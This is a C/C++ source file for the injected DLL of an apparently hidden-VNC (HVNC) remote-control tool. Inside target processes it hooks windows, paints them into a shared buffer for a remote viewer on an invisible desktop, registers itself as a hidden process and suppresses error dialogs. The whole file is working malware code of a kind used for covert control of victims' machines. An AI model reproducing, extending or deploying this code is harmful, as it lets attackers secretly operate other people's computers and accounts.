#include "injlib.h"
#include <shlwapi.h>
#include "..\vnc\windows.h"
#include "..\vnc\dib.h"
#include "..\vnc\events.h"
#include "..\vnc\vnc_func.h"
#include "..\vnc\vnc.h"
#include "..\vnc\cpu_limit.h"
#include "vncmsg.h"
#include "hidevncprocwnd.h"
#include "vncsilence.h"
#include "vncclipboard.h"
#include "hooks.h"
#include <uxtheme.h>

static DWORD dwPID;
JavaPaintHook JavaHooks={0};

PHVNC lpServer;

SHARED_VNC_DATA *lpSharedVNCData;
static HANDLE hDispChangeEvent,hKillEvent,hHandlesMutex,hHandlesMapping,hSharedVNCData;
static DWORD *lpHandlesMapping;

bool IsVNC(HANDLE hDesk,DWORD *lpHash)
{
    char szName[256];
	bool bRet=false;
	if (GetUserObjectInformationA(hDesk,UOI_NAME,szName,sizeof(szName),NULL))
    {
        DWORD dwHash=chksum_crc32((byte*)szName,lstrlenA(szName));
        WaitForSingleObject(hHandlesMutex,INFINITE);
            DWORD *lpCurHash=lpHandlesMapping;
            while (*lpCurHash)
            {
                if (*lpCurHash == dwHash)
                {
                    bRet=true;
                    if (lpHash)
                        *lpHash=dwHash;
                    break;
                }
                lpCurHash++;
            }
        ReleaseMutex(hHandlesMutex);
    }
    return bRet;
}

void ResetWndStyle(HWND hWnd)
{
    if (GetWindowClassFlags(lpServer,hWnd) & WCF_JAVA)
    {
        WINDOWINFO wiInfo;
        wiInfo.cbSize=sizeof(WINDOWINFO);
        GetWindowInfo(hWnd,&wiInfo);
        if ((wiInfo.dwStyle & (WS_DLGFRAME|WS_OVERLAPPEDWINDOW|WS_POPUPWINDOW)) &&  (!(wiInfo.dwExStyle & WS_EX_LAYERED)))
        {
            SetWindowLongPtr(hWnd,GWL_EXSTYLE,wiInfo.dwExStyle | WS_EX_LAYERED & ~WS_EX_TRANSPARENT);
            SetLayeredWindowAttributes(hWnd,0xFFFF,255,LWA_ALPHA);
        }
    }
    return;
}

BOOL CALLBACK ResetClassStyle(HWND hWnd,LPARAM lParam)
{
    ///if (IsWindowVisible(hWnd))
    {
        DWORD dwProcID;
        GetWindowThreadProcessId(hWnd,&dwProcID);
        if (dwProcID == dwPID)
        {
            EnumChildWindows(hWnd,ResetClassStyle,NULL);
            Sleep(1);
            ResetWndStyle(hWnd);
            LONG_PTR dwStyle=GetClassLongPtr(hWnd,GCL_STYLE);
            if (dwStyle & (CS_PARENTDC|CS_OWNDC|CS_CLASSDC))
                SetClassLongPtr(hWnd,GCL_STYLE,dwStyle & ~CS_PARENTDC & ~CS_OWNDC & ~CS_CLASSDC);
        }
    }
    return true;
}

void CALLBACK BadWndClassesThread(void *)
{
    SetThreadDesktopEx(lpServer->hDesktop);
    while (true)
    {
        HWND hPrevWnd=GetWindow(GetWindow(lpServer->WndsInfo.hDeskWnd,GW_CHILD),GW_HWNDLAST);
        do
        {
            ///if (IsWindowVisible(hPrevWnd))
            {
                ResetClassStyle(hPrevWnd,NULL);
                EnumChildWindows(hPrevWnd,ResetClassStyle,NULL);
            }
        }
        while (hPrevWnd=GetWindow(hPrevWnd,GW_HWNDPREV));
        Sleep(1);
    }
}

void HandleWM_PRINT(HWND hWnd)
{
    if (!IsWindowEx(lpServer,hWnd))
        return;

    WINDOWINFO wiInfo;
    wiInfo.cbSize=sizeof(WINDOWINFO);
    GetWindowInfo(hWnd,&wiInfo);
    HWND hParent=GetParent(hWnd);

    if (GetWindowClassFlags(lpServer,hWnd) & WCF_JAVA)
    {
        ResetWndStyle(hWnd);

        JavaPaintHook *pjhd=&JavaHooks;
        while ((pjhd->next) && (pjhd->hWnd != hWnd))
            pjhd=pjhd->next;

        if (pjhd->hWnd != hWnd)
        {
            pjhd->next=(JavaPaintHook*)MemAlloc(sizeof(JavaPaintHook));
            pjhd=pjhd->next;
            pjhd->hDC=CreateCompatibleDC(lpServer->DIBInfo.hIntermedMemDC);
            HBITMAP hBmp=CreateCompatibleBitmap(lpServer->DIBInfo.hIntermedMemDC,lpServer->lpGlobalVNCData->dwWidth,lpServer->lpGlobalVNCData->dwHeight);
            pjhd->hBitmap=(HBITMAP)SelectObject(pjhd->hDC,(HGDIOBJ)hBmp);
            pjhd->hMutex=CreateMutex(NULL,false,NULL);
            pjhd->hWnd=hWnd;
        }

        RedrawWindow(hWnd,NULL,NULL,RDW_ERASE+RDW_INVALIDATE+RDW_FRAME+RDW_ALLCHILDREN+RDW_UPDATENOW+RDW_ERASENOW);
        SendMessage(hWnd,WM_NCACTIVATE,true,NULL);
        PrintWindow(hParent,lpServer->DIBInfo.hIntermedMemDC,0);
        DefWindowProc(hWnd,WM_PRINT,(WPARAM)lpServer->DIBInfo.hIntermedMemDC,PRF_CLIENT+PRF_NONCLIENT+PRF_CHILDREN+PRF_ERASEBKGND+PRF_OWNED);

        WaitForSingleObject(pjhd->hMutex,INFINITE);
            SetViewportOrgEx(pjhd->hDC,0,0,NULL);
            if (wiInfo.rcWindow.left < 0)
                wiInfo.rcWindow.left=0;
            if (wiInfo.rcWindow.top < 0)
                wiInfo.rcWindow.top=0;
            int ClientX=wiInfo.rcClient.left-wiInfo.rcWindow.left,
                ClientY=wiInfo.rcClient.top-wiInfo.rcWindow.top;
            BitBlt(lpServer->DIBInfo.hIntermedMemDC,ClientX,ClientY,wiInfo.rcClient.right-wiInfo.rcClient.left,wiInfo.rcClient.bottom-wiInfo.rcClient.top,pjhd->hDC,0,0,SRCCOPY);
        ReleaseMutex(pjhd->hMutex);
    }
    else
    {
        if (GetClassLongPtr(hParent,GCL_STYLE) & (CS_CLASSDC|CS_PARENTDC))
            DefWindowProc(hParent,WM_PRINT,(WPARAM)lpServer->DIBInfo.hTmpIntermedMemDC,PRF_CLIENT+PRF_NONCLIENT+PRF_CHILDREN+PRF_ERASEBKGND+PRF_OWNED);
        else
            PrintWindow(hParent,lpServer->DIBInfo.hTmpIntermedMemDC,0);
        POINT pt={wiInfo.rcWindow.left,wiInfo.rcWindow.top};
        ScreenToClient(hParent,&pt);
        BitBlt(lpServer->DIBInfo.hIntermedMemDC,0,0,wiInfo.rcClient.right-wiInfo.rcClient.left,wiInfo.rcClient.bottom-wiInfo.rcClient.top,lpServer->DIBInfo.hTmpIntermedMemDC,pt.x,pt.y,SRCCOPY);
        DefWindowProc(hWnd,WM_PRINT,(WPARAM)lpServer->DIBInfo.hIntermedMemDC,PRF_CLIENT+PRF_NONCLIENT+PRF_CHILDREN+PRF_ERASEBKGND+PRF_OWNED);
    }
    CopyScreenBuffer(lpServer,&wiInfo.rcWindow);
    return;
}

BOOL CALLBACK TestProgrammersIQ(HWND hWnd,LPARAM lParam)
{
    if (IsWindowVisible(hWnd))
    {
        DWORD dwProcID;
        GetWindowThreadProcessId(hWnd,&dwProcID);
        if (dwProcID == dwPID)
        {
            EnumChildWindows(hWnd,TestProgrammersIQ,NULL);
            Sleep(1);
            if (SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_IQTEST,0) != VMR_IQOK)
                AppendSubclassedWnd(hWnd,SetWindowLongPtr(hWnd,GWLP_WNDPROC,(LONG_PTR)SubclassProcForIdioticCodes));
        }
    }
    return true;
}

void CALLBACK IdiotProgrammersDetectionThread(void *)
{
    SetThreadDesktopEx(lpServer->hDesktop);
    while (true)
    {
        HWND hPrevWnd=GetWindow(GetWindow(lpServer->WndsInfo.hDeskWnd,GW_CHILD),GW_HWNDLAST);
        do
        {
            TestProgrammersIQ(hPrevWnd,NULL);
            EnumChildWindows(hPrevWnd,TestProgrammersIQ,NULL);
        }
        while (hPrevWnd=GetWindow(hPrevWnd,GW_HWNDPREV));
        Sleep(1);
    }
    return;
}

BOOL CALLBACK EnumProcessWindows(HWND hWnd,LPARAM lParam)
{
    DWORD dwProcessId;

    GetWindowThreadProcessId(hWnd,&dwProcessId);
    if (dwProcessId == dwPID)
        SendMessage(hWnd,WM_THEMECHANGED,0,0);

    Sleep(1);

    return TRUE;
}

CRITICAL_SECTION csTransMsgWnds;
void WINAPI RemoteThread(void *)
{
    do
    {
        OSVERSIONINFO osvi;
        osvi.dwOSVersionInfoSize=sizeof(osvi);
        GetVersionEx(&osvi);
        bXP=(osvi.dwMajorVersion <= 5);

        lpServer=NULL;
        dwPID=GetCurrentProcessId();
        if (!SysCheckProcessGroup(dwPID))
            break;

        hHandlesMutex=OpenMutex(MUTEX_ALL_ACCESS,false,HVNC_HANDLES_MUTEX_NAME);
        if (!hHandlesMutex)
            break;

        hHandlesMapping=OpenFileMapping(FILE_MAP_READ,false,HVNC_HANDLES_MAPPING_NAME);
        lpHandlesMapping=(DWORD *)MapViewOfFile(hHandlesMapping,FILE_MAP_READ,0,0,0);
        if (!lpHandlesMapping)
            break;

        hSharedVNCData=OpenFileMapping(FILE_MAP_READ,false,HVNC_SHARED_VNC_MAPPING_NAME);
        lpSharedVNCData=(SHARED_VNC_DATA *)MapViewOfFile(hSharedVNCData,FILE_MAP_READ,0,0,0);
        if (!lpSharedVNCData)
            break;

        hDispChangeEvent=OpenEvent(EVENT_ALL_ACCESS,false,HVNC_DISP_CHANGE_EVENT_NAME);
        if (!hDispChangeEvent)
            break;

        DWORD dwHash;
        if (IsVNC(GetThreadDesktop(GetCurrentThreadId()),&dwHash))
        {
            lpServer=(PHVNC)VirtualAlloc(NULL,sizeof(HVNCS),MEM_COMMIT,PAGE_READWRITE);
            if (!lpServer)
                break;

            MessageBoxTimeout=(_MessageBoxTimeout)GetProcAddress(GetModuleHandle(_T("user32")),"MessageBoxTimeoutA");
            if (!MessageBoxTimeout)
                break;

            lpServer->Names.dwHash=dwHash;
            InitGlobalDataNames(lpServer);

            lpServer->hGlobalVNCMapping=OpenFileMapping(FILE_MAP_ALL_ACCESS,false,lpServer->Names.szGlobalMappingName);
            lpServer->lpGlobalVNCData=(GLOBAL_VNC_DATA *)MapViewOfFile(lpServer->hGlobalVNCMapping,FILE_MAP_ALL_ACCESS,0,0,0);
            if (!lpServer->lpGlobalVNCData)
                break;

            lpServer->DeskInfo.dwFlags=lpServer->lpGlobalVNCData->dwDeskFlags;
            lstrcpyA(lpServer->DeskInfo.szDeskName,lpServer->lpGlobalVNCData->szDeskName);
            SetScreenSize(lpServer,lpServer->lpGlobalVNCData->dwHeight,lpServer->lpGlobalVNCData->dwWidth,lpServer->lpGlobalVNCData->bBitsPerPixel);

            lpServer->hDesktop=OpenDesktopA(lpServer->DeskInfo.szDeskName,NULL,FALSE,GENERIC_READ);
            lpServer->bIsVNC=true;

            if ((!(lpServer->EventsInfo.hInputMutex=OpenMutex(MUTEX_ALL_ACCESS,false,lpServer->Names.szInputMutex))) ||
                (!(lpServer->EventsInfo.hSharedMemMutex=OpenMutex(MUTEX_ALL_ACCESS,false,lpServer->Names.szSharedMemMutex))) ||
                (!(lpServer->EventsInfo.hVNCKillEvent=OpenEvent(EVENT_ALL_ACCESS,false,lpServer->Names.szVNCKillEventName))) ||
                (!(lpServer->EventsInfo.hSendThreadMessageEvent=OpenEvent(EVENT_ALL_ACCESS,false,lpServer->Names.szSendThreadMessageEvent))) ||
                (!(lpServer->EventsInfo.hSendThreadMessageMutex=OpenMutex(MUTEX_ALL_ACCESS,false,lpServer->Names.szSendThreadMessageMutex))) ||
                (!(lpServer->EventsInfo.hClipboardUpdatedEvent=OpenEvent(EVENT_ALL_ACCESS,false,lpServer->Names.szClipboardUpdatedEvent))))
                break;

            CheckPCPerfomance();
            SetPriorityClass(GetCurrentProcess(),BELOW_NORMAL_PRIORITY_CLASS);

            HANDLE hHiddenProcessMarker=RegisterHiddenProcess();
#ifndef _DEBUG
            SetErrorMode(SEM_NOGPFAULTERRORBOX+SEM_NOALIGNMENTFAULTEXCEPT+SEM_NOOPENFILEERRORBOX);
#endif

            g_enter(hSharedMemMutex)
            {
                lpServer->hSharedMemMapping=OpenFileMapping(FILE_MAP_ALL_ACCESS,false,lpServer->Names.szSharedMemMappingName);
                lpServer->lpSharedMemMapping=(byte *)MapViewOfFile(lpServer->hSharedMemMapping,FILE_MAP_ALL_ACCESS,0,0,0);
                if (!lpServer->lpSharedMemMapping)
                {
                    SysCloseHandle(hHiddenProcessMarker);
                    g_leave(hSharedMemMutex)
                    break;
                }
            }
            g_leave(hSharedMemMutex)

            while (!lpServer->lpGlobalVNCData->dwExplorersPID)
                Sleep(1);

            lpServer->WndsInfo.hDeskWnd=GetDesktopWindow();
            if ((!bXP) && (lpServer->lpGlobalVNCData->dwExplorersPID == dwPID))
            {
                bShell=true;
                HWND hProgmanWnd;
                do
                {
                    hProgmanWnd=FindWindowEx(NULL,NULL,_T("Progman"),_T("Program Manager"));
                    Sleep(1);
                }
                while (!hProgmanWnd);

                lpServer->WndsInfo.hDefView=FindWnd(hProgmanWnd,_T("SHELLDLL_DefView"),NULL);
                lpServer->WndsInfo.hDeskListView=FindWnd(lpServer->WndsInfo.hDefView,_T("SysListView32"),_T("FolderView"));
                hBkgBrush=CreateSolidBrush(RGB(0x3A,0x6E,0xA5));
            }

            lpServer->DIBInfo.hIntermedMemDC=0;
            InitIntermedDC(lpServer,NULL);

            InitializeCriticalSection(&csTransMsgWnds);
            DoVNCHooks();

            lpServer->WndsInfo.hTrayWnd=FindWnd(NULL,_T("Shell_TrayWnd"),NULL);

            lpServer->WndsInfo.hOverflowIconWindow=FindWnd(NULL,_T("NotifyIconOverflowWindow"),NULL);

            if (IsPCSlow(lpServer))
                SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)BadWndClassesThread,NULL);
            SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)IdiotProgrammersDetectionThread,NULL);

            g_enter(hSendThreadMessageMutex)
            {
                THREADITEM *lpIDs=lpServer->lpGlobalVNCData->dwIDs;
                for (int i=0; i < countof(lpServer->lpGlobalVNCData->dwIDs); i++)
                {
                    if (!lpIDs[i].dwId)
                    {
                        lpIDs[i].dwId=(DWORD_PTR)GetCurrentThreadId();
                        break;
                    }
                }
            }
            g_leave(hSendThreadMessageMutex)

            if (!(lpServer->DeskInfo.dwFlags & HVNC_DONT_DISABLE_THEMES))
            {
                DWORD dwTheme;
                if (!bXP)
                    dwTheme=GetThemeAppProperties();

                SetThemeAppProperties(0);
                EnumWindows(EnumProcessWindows,NULL);

                if (!bXP)
                    SetThemeAppProperties(dwTheme);
            }

            while (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,1) == WAIT_TIMEOUT)
            {
                MSG msg;
                if (PeekMessage(&msg,(HWND)INVALID_HANDLE_VALUE,0,0,PM_REMOVE))
                {
                    if (msg.message == lpServer->lpGlobalVNCData->dwVNCMessage)
                    {
                        if (msg.wParam == VMW_DISPCHANGES)
                        {
                            if ((lpServer->DeskInfo.dwHeight != lpSharedVNCData->dwNewWidth) || (lpServer->DeskInfo.dwHeight != lpSharedVNCData->dwNewHeight))
                            {
                                if (!msg.lParam)
                                {
                                    if (lpServer->hSharedMemMapping)
                                    {
                                        UnmapViewOfFile(lpServer->lpSharedMemMapping);
                                        SysCloseHandle(lpServer->hSharedMemMapping);
                                        lpServer->hSharedMemMapping=NULL;
                                        lpServer->lpSharedMemMapping=NULL;
                                    }
                                }
                                else
                                {
                                    lpServer->hSharedMemMapping=OpenFileMapping(FILE_MAP_ALL_ACCESS,false,lpServer->Names.szSharedMemMappingName);
                                    lpServer->lpSharedMemMapping=(byte *)MapViewOfFile(lpServer->hSharedMemMapping,FILE_MAP_ALL_ACCESS,0,0,0);
                                    SetScreenSize(lpServer,lpSharedVNCData->dwNewHeight,lpSharedVNCData->dwNewWidth,lpSharedVNCData->bNewBitsPerPixel);
                                    InitIntermedDC(lpServer,NULL);
                                }
                            }
                        }
                        SetEvent(lpServer->EventsInfo.hSendThreadMessageEvent);
                    }
                }
            }
        }
        else
        {
            hKillEvent=OpenEvent(EVENT_ALL_ACCESS,false,HVNC_KILL_EVENT_NAME);
            DoCommonHooks();
            WaitForSingleObject(hKillEvent,INFINITE);
            RemoveCommonHooks();
            Sleep(100);
        }
    }
    while (false);

    if (lpServer)
        ExitProcess(1);

    UnmapViewOfFile(lpSharedVNCData);
    SysCloseHandle(hSharedVNCData);
    SysCloseHandle(hDispChangeEvent);
    SysCloseHandle(hKillEvent);
    SysCloseHandle(hHandlesMutex);
    UnmapViewOfFile(lpHandlesMapping);
    SysCloseHandle(hHandlesMapping);
    return;
}
